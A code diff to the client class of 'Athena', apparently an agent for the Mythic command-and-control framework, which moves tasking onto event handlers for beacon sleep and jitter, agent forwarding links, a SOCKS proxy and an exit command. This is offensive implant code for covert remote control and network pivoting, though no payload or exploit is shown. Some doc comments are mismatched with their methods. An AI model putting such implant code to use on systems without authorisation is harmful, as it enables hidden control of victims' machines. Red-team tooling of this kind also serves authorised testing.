@@ -12,6 +12,8 @@ using System.Threading.Tasks;
 using Athena.Commands;
 using Athena.Commands.Model;
 using PluginBase;
+using System.Text;
+using Athena.Models.Athena.Commands;
 
 namespace Athena
 {
@@ -21,17 +23,23 @@ namespace Athena
         public MythicConfig MythicConfig { get; set; }
         public CommandHandler commandHandler { get; set; }
         public SocksHandler socksHandler { get; set; }
-
+        public bool exit { get; set; }
         public MythicClient()
         {
+            this.exit = false;
             this.MythicConfig = new MythicConfig();
+            
             this.commandHandler = new CommandHandler();
+            this.commandHandler.SetSleepAndJitter += SetSleepAndJitter;
+            this.commandHandler.StartForwarder += StartForwarder;
+            this.commandHandler.StopForwarder += StopForwarder;
+            this.commandHandler.StartSocks += StartSocks;
+            this.commandHandler.StopSocks += StopSocks;
+            this.commandHandler.ExitRequested += ExitRequested;
+            
             this.socksHandler = new SocksHandler();
-            this.commandHandler.ActionSetSleepAndJitter = SetSleepAndJitter;
-            this.commandHandler.ActionStartForwarder = StartForwarder;
-            this.commandHandler.ActionStartSocks = StartSocks;
-        }
 
+        }
         #region Communication Functions      
         /// <summary>
         /// Performa  check-in with the Mythic server
@@ -75,43 +83,135 @@ namespace Athena
                 return new CheckinResponse();
             }
         }
-
-
-        private void SetSleepAndJitter(int[] sleepArgs)
+        /// <summary>
+        /// EventHandler to update the sleep and jitter
+        /// </summary>
+        /// <param name="sender">Event Sender</param>
+        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
+        private void SetSleepAndJitter(object sender, TaskEventArgs e)
         {
-            this.MythicConfig.sleep = sleepArgs[0];
-            this.MythicConfig.jitter = sleepArgs[1];
+            StringBuilder sb = new StringBuilder();
+            ResponseResult result = new ResponseResult() { 
+                completed = "true",
+                task_id = e.job.task.id
+            };
+            var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(e.job.task.parameters);
+            try
+            {
+                this.MythicConfig.sleep = int.Parse((string)sleepInfo["sleep"]);
+                sb.AppendLine($"Updated sleep to: {(string)sleepInfo["sleep"]}");
+                this.MythicConfig.jitter = int.Parse((string)sleepInfo["jitter"]);
+                sb.AppendLine($"Updated jitter to: {(string)sleepInfo["jitter"]}");
+            }
+            catch
+            {
+                sb.AppendLine("Invalid sleep or jitter specified");
+                result.status = "error";
+            }
+            result.user_output = sb.ToString();
+
+            _ = commandHandler.AddResponse(result);
+
         }
-
-        private void StartForwarder(MythicJob job)
+        /// <summary>
+        /// EventHandler to start the forwarder
+        /// </summary>
+        /// <param name="sender">Event Sender</param>
+        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
+        private void StartForwarder(object sender, TaskEventArgs e)
         {
-            var res = MythicConfig.forwarder.Link(job).Result;
+            var res = MythicConfig.forwarder.Link(e.job).Result;
             _ = commandHandler.AddResponse(res);
         }
-
-        private void StartSocks(MythicJob job)
+        /// <summary>
+        /// EventHandler to stop the forwarder
+        /// </summary>
+        /// <param name="sender">Event Sender</param>
+        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
+        private void StopForwarder(object sender, TaskEventArgs e)
+        {
+            MythicConfig.forwarder.Unlink();
+            _ = commandHandler.AddResponse(new ResponseResult
+            {
+                user_output = "Unlinked from agent",
+                task_id = e.job.task.id,
+                completed = "true",
+            });
+        }
+        /// <summary>
+        /// EventHandler to update the Sleep and Jitter
+        /// </summary>
+        /// <param name="sender">Event Sender</param>
+        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
+        private void StartSocks(object sender, TaskEventArgs e)
         {
             if (this.socksHandler.Start().Result)
             {
-                this.commandHandler.AddResponse(new ResponseResult
+                _ = this.commandHandler.AddResponse(new ResponseResult
                 {
                     user_output = "Socks Started",
                     completed = "true",
-                    task_id = job.task.id,
+                    task_id = e.job.task.id,
                 });
             }
             else
             {
-                this.commandHandler.AddResponse(new ResponseResult
+                _ = this.commandHandler.AddResponse(new ResponseResult
                 {
                     user_output = "Failed to start socks",
                     completed = "true",
-                    task_id = job.task.id,
+                    task_id = e.job.task.id,
                     status = "error"
                 });
             }
         }
-
+        /// <summary>
+        /// EventHandler to starts socks forwarder
+        /// </summary>
+        /// <param name="sender">Event Sender</param>
+        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
+        private void StopSocks(object sender, TaskEventArgs e)
+        {
+            if (this.socksHandler.Stop().Result)
+            {
+                _ = this.commandHandler.AddResponse(new ResponseResult
+                {
+                    user_output = "Socks stopped",
+                    completed = "true",
+                    task_id = e.job.task.id,
+                });
+            }
+            else
+            {
+                _ = this.commandHandler.AddResponse(new ResponseResult
+                {
+                    user_output = "Failed to stop socks",
+                    completed = "true",
+                    task_id = e.job.task.id,
+                    status = "error"
+                });
+            }
+        }
+        /// <summary>
+        /// EventHandler to stop socks forwarder
+        /// </summary>
+        /// <param name="sender">Event Sender</param>
+        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
+        private void ExitRequested(object sender, TaskEventArgs e)
+        {
+            _ = this.commandHandler.AddResponse(new ResponseResult
+            {
+                user_output = @"Thank you, I'll say goodbye soon
+Though its the end of the world,
+Don't blame yourself now
+And if its true,
+I will surround you and give life to a world
+That's our own",
+                completed = "true",
+                task_id = e.job.task.id,
+            });
+            this.exit = true;
+        }
 
         /// <summary>
         /// Perform a get tasking action with the Mythic server to return current responses and check for new tasks
